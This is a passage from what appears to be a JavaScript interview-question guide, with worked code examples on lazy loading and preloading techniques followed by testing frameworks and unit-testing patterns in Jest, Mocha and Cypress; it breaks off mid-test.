                this.preloadUrl(link.href);
            }
        });
    }
    
    // Preload links in viewport
    preloadVisibleLinks() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    const link = entry.target;
                    if (this.shouldPreload(link.href)) {
                        this.preloadUrl(link.href);
                    }
                }
            });
        }, {
            rootMargin: '200px'
        });
        
        document.querySelectorAll('a[data-preload]').forEach(link => {
            observer.observe(link);
        });
    }
    
    // Preload during browser idle time
    initIdlePreload() {
        if ('requestIdleCallback' in window) {
            requestIdleCallback(() => {
                this.preloadQueue.forEach(url => {
                    if (!this.preloadedUrls.has(url)) {
                        this.preloadUrl(url);
                    }
                });
            });
        }
    }
    
    shouldPreload(url) {
        // Don't preload external links or already preloaded
        return url && 
               url.startsWith(window.location.origin) && 
               !this.preloadedUrls.has(url);
    }
    
    preloadUrl(url) {
        if (this.preloadedUrls.has(url)) return;
        
        // Use link prefetch
        const link = document.createElement('link');
        link.rel = 'prefetch';
        link.href = url;
        link.as = 'document';
        
        link.onload = () => {
            this.preloadedUrls.add(url);
            console.log(`Preloaded: ${url}`);
        };
        
        link.onerror = () => {
            console.error(`Failed to preload: ${url}`);
        };
        
        document.head.appendChild(link);
    }
    
    // Add URL to preload queue
    addToQueue(url) {
        if (!this.preloadQueue.includes(url)) {
            this.preloadQueue.push(url);
        }
    }
}

// Usage
const preloader = new SmartPreloader();

// Add important pages to queue
preloader.addToQueue('/products');
preloader.addToQueue('/about');
```

### Progressive Image Loading

```javascript
// Load images progressively (blur-up technique)
class ProgressiveImageLoader {
    constructor(selector = '.progressive-image') {
        this.images = document.querySelectorAll(selector);
        this.init();
    }
    
    init() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadProgressiveImage(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        });
        
        this.images.forEach(img => observer.observe(img));
    }
    
    loadProgressiveImage(container) {
        const placeholder = container.querySelector('.placeholder');
        const fullImage = container.querySelector('.full-image');
        
        if (!fullImage) return;
        
        const fullSrc = fullImage.dataset.src;
        
        // Load full resolution image
        const img = new Image();
        img.onload = () => {
            fullImage.src = fullSrc;
            fullImage.classList.add('loaded');
            
            // Fade out placeholder
            setTimeout(() => {
                if (placeholder) {
                    placeholder.style.opacity = '0';
                }
            }, 50);
        };
        
        img.src = fullSrc;
    }
}

// Usage
const progressiveLoader = new ProgressiveImageLoader();
```

```html
<!-- HTML structure -->
<div class="progressive-image">
    <!-- Tiny blurred placeholder (loaded immediately) -->
    <img src="tiny-10x10.jpg" class="placeholder" alt="Description">
    
    <!-- Full image (lazy loaded) -->
    <img data-src="full-image.jpg" class="full-image" alt="Description">
</div>

<style>
.progressive-image {
    position: relative;
    overflow: hidden;
}

.placeholder {
    filter: blur(20px);
    transform: scale(1.1);
    transition: opacity 0.5s ease;
}

.full-image {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;
    transition: opacity 0.5s ease;
}

.full-image.loaded {
    opacity: 1;
}
</style>
```

### Lazy Loading with Priority

```javascript
// Load resources based on priority
class PriorityLazyLoader {
    constructor() {
        this.queues = {
            high: [],
            medium: [],
            low: []
        };
        this.loading = false;
    }
    
    // Add resource to queue with priority
    add(resource, priority = 'medium') {
        if (!this.queues[priority]) {
            priority = 'medium';
        }
        
        this.queues[priority].push(resource);
    }
    
    // Process queues in priority order
    async process() {
        if (this.loading) return;
        
        this.loading = true;
        
        // Load high priority first
        await this.loadQueue('high');
        
        // Then medium priority
        await this.loadQueue('medium');
        
        // Finally low priority during idle time
        if ('requestIdleCallback' in window) {
            requestIdleCallback(() => {
                this.loadQueue('low');
            });
        } else {
            await this.loadQueue('low');
        }
        
        this.loading = false;
    }
    
    async loadQueue(priority) {
        const queue = this.queues[priority];
        
        while (queue.length > 0) {
            const resource = queue.shift();
            
            try {
                await this.loadResource(resource);
            } catch (error) {
                console.error(`Failed to load ${resource.type}:`, error);
            }
        }
    }
    
    loadResource(resource) {
        return new Promise((resolve, reject) => {
            switch (resource.type) {
                case 'image':
                    this.loadImage(resource.url, resolve, reject);
                    break;
                case 'script':
                    this.loadScript(resource.url, resolve, reject);
                    break;
                case 'style':
                    this.loadStyle(resource.url, resolve, reject);
                    break;
                default:
                    reject(new Error('Unknown resource type'));
            }
        });
    }
    
    loadImage(url, resolve, reject) {
        const img = new Image();
        img.onload = resolve;
        img.onerror = reject;
        img.src = url;
    }
    
    loadScript(url, resolve, reject) {
        const script = document.createElement('script');
        script.src = url;
        script.onload = resolve;
        script.onerror = reject;
        document.body.appendChild(script);
    }
    
    loadStyle(url, resolve, reject) {
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = url;
        link.onload = resolve;
        link.onerror = reject;
        document.head.appendChild(link);
    }
}

// Usage
const loader = new PriorityLazyLoader();

// Add resources with priorities
loader.add({ type: 'image', url: '/hero.jpg' }, 'high');
loader.add({ type: 'script', url: '/analytics.js' }, 'low');
loader.add({ type: 'style', url: '/theme.css' }, 'medium');

// Process all queues
loader.process();
```

### Lazy Loading with Fallback

```javascript
// Lazy loading with error handling and fallbacks
class FallbackLazyLoader {
    constructor() {
        this.retryCount = 3;
        this.retryDelay = 1000;
    }
    
    async loadWithFallback(primary, fallback) {
        try {
            return await this.loadResource(primary);
        } catch (error) {
            console.warn('Primary resource failed, trying fallback:', error);
            
            if (fallback) {
                try {
                    return await this.loadResource(fallback);
                } catch (fallbackError) {
                    console.error('Both primary and fallback failed:', fallbackError);
                    throw fallbackError;
                }
            }
            
            throw error;
        }
    }
    
    async loadResource(url, attempt = 1) {
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            return response;
        } catch (error) {
            if (attempt < this.retryCount) {
                console.log(`Retry ${attempt}/${this.retryCount} for ${url}`);
                
                // Wait before retry
                await new Promise(resolve => 
                    setTimeout(resolve, this.retryDelay * attempt)
                );
                
                return this.loadResource(url, attempt + 1);
            }
            
            throw error;
        }
    }
    
    async loadImage(primarySrc, fallbackSrc) {
        return new Promise(async (resolve, reject) => {
            const img = new Image();
            
            img.onload = () => resolve(img);
            img.onerror = async () => {
                if (fallbackSrc) {
                    img.src = fallbackSrc;
                } else {
                    reject(new Error('Image load failed'));
                }
            };
            
            try {
                await this.loadResource(primarySrc);
                img.src = primarySrc;
            } catch (error) {
                if (fallbackSrc) {
                    img.src = fallbackSrc;
                } else {
                    reject(error);
                }
            }
        });
    }
}

// Usage
const loader = new FallbackLazyLoader();

// Load with CDN fallback
loader.loadWithFallback(
    'https://cdn.example.com/library.js',
    '/local/library.js'
).then(() => {
    console.log('Library loaded');
}).catch(error => {
    console.error('Failed to load library:', error);
});

// Load image with fallback
loader.loadImage('/images/photo.jpg', '/images/placeholder.jpg')
    .then(img => {
        document.body.appendChild(img);
    })
    .catch(error => {
        console.error('Failed to load image:', error);
    });
```

### Performance Monitoring for Lazy Loading

```javascript
// Track lazy loading performance
class LazyLoadMonitor {
    constructor() {
        this.metrics = {
            totalImages: 0,
            loadedImages: 0,
            failedImages: 0,
            averageLoadTime: 0,
            loadTimes: []
        };
    }
    
    trackImageLoad(src, startTime) {
        this.metrics.totalImages++;
        
        const img = new Image();
        
        img.onload = () => {
            const loadTime = performance.now() - startTime;
            this.metrics.loadedImages++;
            this.metrics.loadTimes.push(loadTime);
            this.updateAverageLoadTime();
            
            console.log(`Image loaded: ${src} (${loadTime.toFixed(2)}ms)`);
            this.reportMetrics();
        };
        
        img.onerror = () => {
            this.metrics.failedImages++;
            console.error(`Image failed: ${src}`);
            this.reportMetrics();
        };
        
        img.src = src;
    }
    
    updateAverageLoadTime() {
        const sum = this.metrics.loadTimes.reduce((a, b) => a + b, 0);
        this.metrics.averageLoadTime = sum / this.metrics.loadTimes.length;
    }
    
    reportMetrics() {
        console.log('Lazy Load Metrics:', {
            total: this.metrics.totalImages,
            loaded: this.metrics.loadedImages,
            failed: this.metrics.failedImages,
            avgLoadTime: `${this.metrics.averageLoadTime.toFixed(2)}ms`,
            successRate: `${((this.metrics.loadedImages / this.metrics.totalImages) * 100).toFixed(2)}%`
        });
        
        // Send to analytics
        this.sendToAnalytics();
    }
    
    sendToAnalytics() {
        fetch('/api/lazy-load-metrics', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(this.metrics)
        }).catch(err => console.error('Failed to send metrics:', err));
    }
}

// Usage
const monitor = new LazyLoadMonitor();

// Track each lazy loaded image
document.querySelectorAll('img[data-src]').forEach(img => {
    const startTime = performance.now();
    const src = img.dataset.src;
    
    // When image enters viewport
    const observer = new IntersectionObserver((entries) => {
        if (entries[0].isIntersecting) {
            monitor.trackImageLoad(src, startTime);
            observer.disconnect();
        }
    });
    
    observer.observe(img);
});
```

### Best Practices for Lazy Loading

```javascript
// Comprehensive lazy loading implementation
class OptimizedLazyLoader {
    constructor(options = {}) {
        this.options = {
            rootMargin: options.rootMargin || '50px',
            threshold: options.threshold || 0.01,
            enableNativeLazy: options.enableNativeLazy !== false,
            placeholder: options.placeholder || 'data:image/svg+xml,...',
            ...options
        };
        
        this.init();
    }
    
    init() {
        // Use native lazy loading if available
        if (this.options.enableNativeLazy && 'loading' in HTMLImageElement.prototype) {
            this.useNativeLazy();
        } else {
            this.useIntersectionObserver();
        }
    }
    
    useNativeLazy() {
        document.querySelectorAll('img[data-src]').forEach(img => {
            img.loading = 'lazy';
            img.src = img.dataset.src;
            
            if (img.dataset.srcset) {
                img.srcset = img.dataset.srcset;
            }
        });
    }
    
    useIntersectionObserver() {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    this.loadElement(entry.target);
                    observer.unobserve(entry.target);
                }
            });
        }, {
            rootMargin: this.options.rootMargin,
            threshold: this.options.threshold
        });
        
        // Observe images
        document.querySelectorAll('img[data-src]').forEach(img => {
            observer.observe(img);
        });
        
        // Observe background images
        document.querySelectorAll('[data-bg]').forEach(el => {
            observer.observe(el);
        });
        
        // Observe iframes
        document.querySelectorAll('iframe[data-src]').forEach(iframe => {
            observer.observe(iframe);
        });
    }
    
    loadElement(element) {
        if (element.tagName === 'IMG') {
            this.loadImage(element);
        } else if (element.tagName === 'IFRAME') {
            this.loadIframe(element);
        } else if (element.dataset.bg) {
            this.loadBackgroundImage(element);
        }
    }
    
    loadImage(img) {
        const src = img.dataset.src;
        const srcset = img.dataset.srcset;
        
        // Create temp image to handle loading
        const tempImg = new Image();
        
        tempImg.onload = () => {
            img.src = src;
            if (srcset) img.srcset = srcset;
            img.classList.add('loaded');
            img.removeAttribute('data-src');
            img.removeAttribute('data-srcset');
        };
        
        tempImg.onerror = () => {
            img.classList.add('error');
            // Set fallback image
            img.src = this.options.placeholder;
        };
        
        tempImg.src = src;
    }
    
    loadBackgroundImage(element) {
        const bg = element.dataset.bg;
        
        const img = new Image();
        img.onload = () => {
            element.style.backgroundImage = `url(${bg})`;
            element.classList.add('loaded');
            element.removeAttribute('data-bg');
        };
        
        img.src = bg;
    }
    
    loadIframe(iframe) {
        iframe.src = iframe.dataset.src;
        iframe.removeAttribute('data-src');
    }
}

// Initialize with best practices
const lazyLoader = new OptimizedLazyLoader({
    rootMargin: '50px',
    threshold: 0.01,
    enableNativeLazy: true,
    placeholder: 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 300"%3E%3Crect width="400" height="300" fill="%23f0f0f0"/%3E%3C/svg%3E'
});
```

### Important Notes

- Lazy loading reduces initial page load time significantly
- Use native `loading="lazy"` attribute for simple cases
- Intersection Observer API is the modern standard for lazy loading
- Set appropriate `rootMargin` to load images before they enter viewport
- Always provide placeholder images for better UX
- Implement fallback for browsers without Intersection Observer support
- Lazy load images, videos, iframes, and even JavaScript modules
- Monitor lazy loading performance and success rates
- Use priority queues for critical vs non-critical resources
- Combine with other techniques like image optimization and CDN
- Test on slow networks to ensure good experience
- Consider SEO implications (ensure content is crawlable)

---

# JavaScript Testing (53-56)

## 53. What are some JavaScript testing frameworks you know?

JavaScript has various testing frameworks for different testing needs and preferences.

### Popular Testing Frameworks

```javascript
// 1. Jest - Most popular, created by Facebook
// Features: Zero config, snapshot testing, code coverage, mocking

// Installation
// npm install --save-dev jest

// package.json
{
  "scripts": {
    "test": "jest"
  }
}

// Example test file: sum.test.js
function sum(a, b) {
    return a + b;
}

test('adds 1 + 2 to equal 3', () => {
    expect(sum(1, 2)).toBe(3);
});

test('adds negative numbers', () => {
    expect(sum(-1, -2)).toBe(-3);
});

// 2. Mocha - Flexible testing framework
// Features: Flexible, works with any assertion library

// Installation
// npm install --save-dev mocha chai

// Example: test/sum.test.js
const { expect } = require('chai');

describe('Sum Function', function() {
    it('should add two positive numbers', function() {
        expect(sum(2, 3)).to.equal(5);
    });
    
    it('should handle negative numbers', function() {
        expect(sum(-1, 1)).to.equal(0);
    });
});

// 3. Jasmine - Behavior-driven development framework
// Features: No dependencies, built-in assertions

// Installation
// npm install --save-dev jasmine

// Example: spec/sum.spec.js
describe("Sum Function", function() {
    it("adds two numbers", function() {
        expect(sum(1, 2)).toBe(3);
    });
    
    it("handles zero", function() {
        expect(sum(0, 5)).toBe(5);
    });
});

// 4. Cypress - End-to-end testing
// Features: Real browser testing, time travel debugging

// Installation
// npm install --save-dev cypress

// Example: cypress/integration/login.spec.js
describe('Login Page', () => {
    it('successfully logs in', () => {
        cy.visit('/login');
        cy.get('input[name="email"]').type('user@example.com');
        cy.get('input[name="password"]').type('password123');
        cy.get('button[type="submit"]').click();
        cy.url().should('include', '/dashboard');
    });
});

// 5. Vitest - Fast unit test framework (Vite-native)
// Features: Vite-powered, Jest-compatible API

// Installation
// npm install --save-dev vitest

// Example: src/sum.test.js
import { describe, it, expect } from 'vitest';

describe('sum', () => {
    it('adds numbers correctly', () => {
        expect(sum(1, 2)).toBe(3);
    });
});
```

### Testing Libraries and Tools

```javascript
// Assertion Libraries

// 1. Chai - BDD/TDD assertion library
const { expect, assert, should } = require('chai');

// Expect style
expect(foo).to.be.a('string');
expect(foo).to.equal('bar');
expect(foo).to.have.lengthOf(3);

// Assert style
assert.typeOf(foo, 'string');
assert.equal(foo, 'bar');
assert.lengthOf(foo, 3);

// Should style
foo.should.be.a('string');
foo.should.equal('bar');

// 2. Testing Library - DOM testing utilities
// npm install --save-dev @testing-library/react @testing-library/jest-dom

import { render, screen, fireEvent } from '@testing-library/react';
import '@testing-library/jest-dom';

test('button click increments counter', () => {
    render(<Counter />);
    const button = screen.getByText('Increment');
    const count = screen.getByTestId('count');
    
    expect(count).toHaveTextContent('0');
    
    fireEvent.click(button);
    
    expect(count).toHaveTextContent('1');
});

// 3. Sinon - Mocking library
// npm install --save-dev sinon

const sinon = require('sinon');

// Spy
const spy = sinon.spy(console, 'log');
console.log('Hello');
expect(spy.calledWith('Hello')).toBe(true);

// Stub
const stub = sinon.stub(Math, 'random').returns(0.5);
expect(Math.random()).toBe(0.5);

// Mock
const mock = sinon.mock(object);
mock.expects('method').once().returns(42);
```

### Framework Comparison

```javascript
// Jest - Best for: React apps, general purpose
describe('User', () => {
    test('creates user with valid data', () => {
        const user = new User('John', 'john@example.com');
        expect(user.name).toBe('John');
        expect(user.email).toBe('john@example.com');
    });
    
    // Snapshot testing
    test('renders correctly', () => {
        const tree = renderer.create(<Component />).toJSON();
        expect(tree).toMatchSnapshot();
    });
    
    // Mocking
    test('fetches user data', async () => {
        const mockFetch = jest.fn().mockResolvedValue({
            json: async () => ({ name: 'John' })
        });
        global.fetch = mockFetch;
        
        const data = await fetchUser(1);
        expect(data.name).toBe('John');
    });
});

// Mocha + Chai - Best for: Node.js, flexibility
describe('API Tests', () => {
    before(() => {
        // Setup before all tests
    });
    
    beforeEach(() => {
        // Setup before each test
    });
    
    it('should return 200 status', async () => {
        const response = await request(app).get('/api/users');
        expect(response.status).to.equal(200);
    });
    
    after(() => {
        // Cleanup after all tests
    });
});

// Cypress - Best for: E2E testing, integration tests
describe('E-commerce Flow', () => {
    beforeEach(() => {
        cy.visit('/');
    });
    
    it('completes purchase flow', () => {
        // Add to cart
        cy.get('[data-test="product-1"]').click();
        cy.get('[data-test="add-to-cart"]').click();
        
        // Checkout
        cy.get('[data-test="cart-icon"]').click();
        cy.get('[data-test="checkout-button"]').click();
        
        // Fill form
        cy.get('#email').type('user@example.com');
        cy.get('#card-number').type('4242424242424242');
        
        // Submit
        cy.get('[data-test="submit-payment"]').click();
        
        // Verify success
        cy.url().should('include', '/success');
        cy.contains('Order confirmed').should('be.visible');
    });
});
```

### Test Runners

```javascript
// 1. Jest (built-in runner)
// jest.config.js
module.exports = {
    testEnvironment: 'node',
    coverageDirectory: 'coverage',
    collectCoverageFrom: ['src/**/*.js'],
    testMatch: ['**/__tests__/**/*.js', '**/?(*.)+(spec|test).js']
};

// 2. Karma - Test runner for browsers
// karma.conf.js
module.exports = function(config) {
    config.set({
        frameworks: ['jasmine'],
        files: ['src/**/*.js', 'test/**/*.spec.js'],
        browsers: ['Chrome', 'Firefox'],
        singleRun: true
    });
};

// 3. AVA - Minimal test runner
// package.json
{
    "ava": {
        "files": ["test/**/*.test.js"],
        "concurrency": 5,
        "failFast": true
    }
}

// Example test
import test from 'ava';

test('foo', t => {
    t.pass();
});

test('bar', async t => {
    const bar = Promise.resolve('bar');
    t.is(await bar, 'bar');
});
```

### Important Notes

- **Jest**: Most popular, great for React, zero config, built-in coverage
- **Mocha**: Flexible, works with any assertion library, good for Node.js
- **Jasmine**: Standalone, no dependencies, behavior-driven
- **Cypress**: Best for E2E testing, real browser testing
- **Vitest**: Fast, Vite-powered, Jest-compatible
- Choose based on project needs, team familiarity, and ecosystem
- Most frameworks support async testing, mocking, and code coverage
- Consider setup complexity, performance, and community support

---

## 54. How can you write unit tests for JavaScript code?

Unit tests verify individual units of code (functions, methods, classes) in isolation.

### Basic Unit Test Structure

```javascript
// Function to test: calculator.js
function add(a, b) {
    return a + b;
}

function subtract(a, b) {
    return a - b;
}

function multiply(a, b) {
    return a * b;
}

function divide(a, b) {
    if (b === 0) {
        throw new Error('Cannot divide by zero');
    }
    return a / b;
}

module.exports = { add, subtract, multiply, divide };

// Test file: calculator.test.js
const { add, subtract, multiply, divide } = require('./calculator');

// Test suite
describe('Calculator Functions', () => {
    // Test case for addition
    test('adds two positive numbers', () => {
        expect(add(2, 3)).toBe(5);
    });
    
    test('adds negative numbers', () => {
        expect(add(-1, -4)).toBe(-5);
    });
    
    test('adds zero', () => {
        expect(add(5, 0)).toBe(5);
    });
    
    // Test case for division
    test('divides numbers correctly', () => {
        expect(divide(10, 2)).toBe(5);
    });
    
    test('throws error when dividing by zero', () => {
        expect(() => divide(10, 0)).toThrow('Cannot divide by zero');
    });
});
```

### Testing Different Scenarios

```javascript
// User class: user.js
class User {
    constructor(name, email, age) {
        this.name = name;
        this.email = email;
        this.age = age;
    }
    
    isAdult() {
        return this.age >= 18;
    }
    
    getInfo() {
        return `${this.name} (${this.email})`;
    }
    
    updateEmail(newEmail) {
        if (!this.isValidEmail(newEmail)) {
            throw new Error('Invalid email format');
        }
        this.email = newEmail;
    }
    
    isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
}

module.exports = User;

// Test file: user.test.js
const User = require('./user');

describe('User Class', () => {
    let user;
    
    // Setup before each test
    beforeEach(() => {
        user = new User('John Doe', 'john@example.com', 25);
    });
    
    describe('Constructor', () => {
        test('creates user with correct properties', () => {
            expect(user.name).toBe('John Doe');
            expect(user.email).toBe('john@example.com');
            expect(user.age).toBe(25);
        });
    });
    
    describe('isAdult()', () => {
        test('returns true for users 18 or older', () => {
            expect(user.isAdult()).toBe(true);
        });
        
        test('returns false for users under 18', () => {
            user.age = 17;
            expect(user.isAdult()).toBe(false);
        });
        
        test('returns true for exactly 18', () => {
            user.age = 18;
            expect(user.isAdult()).toBe(true);
        });
    });
    
    describe('getInfo()', () => {
        test('returns formatted user info', () => {
            expect(user.getInfo()).toBe('John Doe (john@example.com)');
        });
    });
    
    describe('updateEmail()', () => {
        test('updates email with valid format', () => {
            user.updateEmail('newemail@example.com');
            expect(user.email).toBe('newemail@example.com');
        });
        
        test('throws error for invalid email', () => {
            expect(() => {
                user.updateEmail('invalid-email');
            }).toThrow('Invalid email format');
        });
    });
});

```


### Testing Async Functions

```javascript
// API service: userService.js
class UserService {
    async fetchUser(userId) {
        const response = await fetch(`/api/users/${userId}`);
        
        if (!response.ok) {
            throw new Error('User not found');
        }
        
        return response.json();
    }
    
    async createUser(userData) {
        const response = await fetch('/api/users', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(userData)
        });
        
        return response.json();
    }
    
    async deleteUser(userId) {
        const response = await fetch(`/api/users/${userId}`, {
            method: 'DELETE'
        });
        
        return response.ok;
    }
}

module.exports = UserService;

// Test file: userService.test.js
const UserService = require('./userService');

// Mock fetch globally
global.fetch = jest.fn();

describe('UserService', () => {
    let service;
    
    beforeEach(() => {
        service = new UserService();
        // Clear all mocks before each test
        fetch.mockClear();
    });
    
    describe('fetchUser()', () => {
        test('fetches user successfully', async () => {
            const mockUser = { id: 1, name: 'John', email: 'john@example.com' };
            
            fetch.mockResolvedValueOnce({
                ok: true,
                json: async () => mockUser
            });
            
            const user = await service.fetchUser(1);
            
            expect(fetch).toHaveBeenCalledWith('/api/users/1');
            expect(user).toEqual(mockUser);
        });
        
        test('throws error when user not found', async () => {
            fetch.mockResolvedValueOnce({
                ok: false
            });
            
            await expect(service.fetchUser(999))
                .rejects
                .toThrow('User not found');
        });
    });
    
    describe('createUser()', () => {
        test('creates user with correct data', async () => {
            const userData = { name: 'Jane', email: 'jane@example.com' };
            const mockResponse = { id: 2, ...userData };
            
            fetch.mockResolvedValueOnce({
                ok: true,
                json: async () => mockResponse
            });
            
            const result = await service.createUser(userData);
            
            expect(fetch).toHaveBeenCalledWith('/api/users', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData)
            });
            expect(result).toEqual(mockResponse);
        });
    });
    
    describe('deleteUser()', () => {
        test('returns true on successful deletion', async () => {
            fetch.mockResolvedValueOnce({ ok: true });
            
            const result = await service.deleteUser(1);
            
            expect(result).toBe(true);
        });
        
        test('returns false on failed deletion', async () => {
            fetch.mockResolvedValueOnce({ ok: false });
            
            const result = await service.deleteUser(999);
            
            expect(result).toBe(false);
        });
    });
});
```

### Testing with Mocks and Spies

```javascript
// Shopping cart: cart.js
class ShoppingCart {
    constructor(priceCalculator, logger) {
        this.items = [];
        this.priceCalculator = priceCalculator;
        this.logger = logger;
    }
    
    addItem(item) {
        this.items.push(item);
        this.logger.log(`Added item: ${item.name}`);
    }
    
    removeItem(itemId) {
        const index = this.items.findIndex(item => item.id === itemId);
        
        if (index !== -1) {
            const removed = this.items.splice(index, 1)[0];
            this.logger.log(`Removed item: ${removed.name}`);
            return true;
        }
        
        return false;
    }
    
    getTotal() {
        return this.priceCalculator.calculate(this.items);
    }
    
    clear() {
        const count = this.items.length;
        this.items = [];
        this.logger.log(`Cleared ${count} items from cart`);
    }
}

module.exports = ShoppingCart;

// Test file: cart.test.js
const ShoppingCart = require('./cart');

describe('ShoppingCart', () => {
    let cart;
    let mockPriceCalculator;
    let mockLogger;
    
    beforeEach(() => {
        // Create mocks
        mockPriceCalculator = {
            calculate: jest.fn()
        };
        
        mockLogger = {
            log: jest.fn()
        };
        
        cart = new ShoppingCart(mockPriceCalculator, mockLogger);
    });
    
    describe('addItem()', () => {
        test('adds item to cart', () => {
            const item = { id: 1, name: 'Apple', price: 1.99 };
            
            cart.addItem(item);
            
            expect(cart.items).toHaveLength(1);
            expect(cart.items[0]).toEqual(item);
        });
        
        test('logs when item is added', () => {
            const item = { id: 1, name: 'Apple', price: 1.99 };
            
            cart.addItem(item);
            
            expect(mockLogger.log).toHaveBeenCalledWith('Added item: Apple');
            expect(mockLogger.log).toHaveBeenCalledTimes(1);
        });
    });
    
    describe('removeItem()', () => {
        beforeEach(() => {
            cart.items = [
                { id: 1, name: 'Apple', price: 1.99 },
                { id: 2, name: 'Banana', price: 0.99 }
            ];
        });
        
        test('removes item by id', () => {
            const result = cart.removeItem(1);
            
            expect(result).toBe(true);
            expect(cart.items).toHaveLength(1);
            expect(cart.items[0].id).toBe(2);
        });
        
        test('returns false if item not found', () => {
            const result = cart.removeItem(999);
            
            expect(result).toBe(false);
            expect(cart.items).toHaveLength(2);
        });
        
        test('logs when item is removed', () => {
            cart.removeItem(1);
            
            expect(mockLogger.log).toHaveBeenCalledWith('Removed item: Apple');
        });
    });
    
    describe('getTotal()', () => {
        test('calls price calculator with items', () => {
            cart.items = [
                { id: 1, name: 'Apple', price: 1.99 },
                { id: 2, name: 'Banana', price: 0.99 }
            ];
            
            mockPriceCalculator.calculate.mockReturnValue(2.98);
            
            const total = cart.getTotal();
            
            expect(mockPriceCalculator.calculate).toHaveBeenCalledWith(cart.items);
            expect(total).toBe(2.98);
        });
    });
    
    describe('clear()', () => {
        test('removes all items', () => {
            cart.items = [
                { id: 1, name: 'Apple', price: 1.99 },
                { id: 2, name: 'Banana', price: 0.99 }
            ];
            
            cart.clear();
            
            expect(cart.items).toHaveLength(0);
        });
        
        test('logs number of cleared items', () => {
            cart.items = [
                { id: 1, name: 'Apple', price: 1.99 },
                { id: 2, name: 'Banana', price: 0.99 }
            ];
            
            cart.clear();
            
            expect(mockLogger.log).toHaveBeenCalledWith('Cleared 2 items from cart');
        });
    });
});
```

### Testing Edge Cases and Error Handling

```javascript
// Validation utility: validator.js
class Validator {
    static validateEmail(email) {
        if (!email) {
            throw new Error('Email is required');
        }
        
        if (typeof email !== 'string') {
            throw new Error('Email must be a string');
        }
        
        if (email.length > 255) {
            throw new Error('Email is too long');
        }
        
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(email)) {
            throw new Error('Invalid email format');
        }
        
        return true;
    }
    
    static validatePassword(password) {
        if (!password) {
            throw new Error('Password is required');
        }
        
        if (password.length < 8) {
            throw new Error('Password must be at least 8 characters');
        }
        
        if (!/[A-Z]/.test(password)) {
            throw new Error('Password must contain uppercase letter');
        }
        
        if (!/[a-z]/.test(password)) {
            throw new Error('Password must contain lowercase letter');
        }
        
        if (!/[0-9]/.test(password)) {
            throw new Error('Password must contain number');
        }
        
        return true;
    }
    
    static validateAge(age) {
        if (age === null || age === undefined) {
            throw new Error('Age is required');
        }
        
        if (typeof age !== 'number') {
            throw new Error('Age must be a number');
        }
        
        if (!Number.isInteger(age)) {
            throw new Error('Age must be an integer');
        }
        
        if (age < 0) {
            throw new Error('Age cannot be negative');
        }
        
        if (age > 150) {
            throw new Error('Age is not realistic');
        }
        
        return true;
    }
}

module.exports = Validator;

// Test file: validator.test.js
const Validator = require('./validator');

describe('Validator', () => {
    describe('validateEmail()', () => {
        // Happy path
        test('accepts valid email', () => {
            expect(Validator.validateEmail('user@example.com')).toBe(true);
        });
        
        // Edge cases
        test('throws error for empty email', () => {
            expect(() => Validator.validateEmail('')).toThrow('Email is required');
        });
        
        test('throws error for null email', () => {
            expect(() => Validator.validateEmail(null)).toThrow('Email is required');
        });
        
        test('throws error for non-string email', () => {
            expect(() => Validator.validateEmail(123)).toThrow('Email must be a string');
        });
        
        test('throws error for too long email', () => {
            const longEmail = 'a'.repeat(250) + '@example.com';
            expect(() => Validator.validateEmail(longEmail)).toThrow('Email is too long');
        });
        
        test('throws error for invalid format', () => {
            expect(() => Validator.validateEmail('invalid')).toThrow('Invalid email format');
            expect(() => Validator.validateEmail('no@domain')).toThrow('Invalid email format');
            expect(() => Validator.validateEmail('@example.com')).toThrow('Invalid email format');
        });
        
        // Boundary cases
        test('accepts email at max length', () => {
            const maxEmail = 'a'.repeat(243) + '@example.com'; // 255 chars
            expect(Validator.validateEmail(maxEmail)).toBe(true);
        });
    });
    
    describe('validatePassword()', () => {
        test('accepts valid password', () => {
            expect(Validator.validatePassword('Password123')).toBe(true);
        });
        
        test('throws error for empty password', () => {
            expect(() => Validator.validatePassword('')).toThrow('Password is required');
        });
        
        test('throws error for too short password', () => {
            expect(() => Validator.validatePassword('Pass1')).toThrow('Password must be at least 8 characters');
        });
        
        test('throws error without uppercase', () => {
            expect(() => Validator.validatePassword('password123')).toThrow('Password must contain uppercase letter');
        });
        
        test('throws error without lowercase', () => {
            expect(() => Validator.validatePassword('PASSWORD123')).toThrow('Password must contain lowercase letter');
        });
        
        test('throws error without number', () => {
            expect(() => Validator.validatePassword('Password')).toThrow('Password must contain number');
        });
        
        // Boundary case
        test('accepts password exactly 8 characters', () => {
            expect(Validator.validatePassword('Pass123!')).toBe(true);
        });
    });
    
    describe('validateAge()', () => {
        test('accepts valid age', () => {
            expect(Validator.validateAge(25)).toBe(true);
        });
        
        test('throws error for undefined age', () => {
            expect(() => Validator.validateAge(undefined)).toThrow('Age is required');
        });
        
        test('throws error for null age', () => {
            expect(() => Validator.validateAge(null)).toThrow('Age is required');
        });
        
        test('throws error for non-number age', () => {
            expect(() => Validator.validateAge('25')).toThrow('Age must be a number');
        });
        
        test('throws error for decimal age', () => {
            expect(() => Validator.validateAge(25.5)).toThrow('Age must be an integer');
        });
        
        test('throws error for negative age', () => {
            expect(() => Validator.validateAge(-1)).toThrow('Age cannot be negative');
        });
        
        test('throws error for unrealistic age', () => {
            expect(() => Validator.validateAge(200)).toThrow('Age is not realistic');
        });
        
        // Boundary cases
        test('accepts age 0', () => {
            expect(Validator.validateAge(0)).toBe(true);
        });
        
        test('accepts age 150', () => {
            expect(Validator.validateAge(150)).toBe(true);
        });
        
        test('rejects age 151', () => {
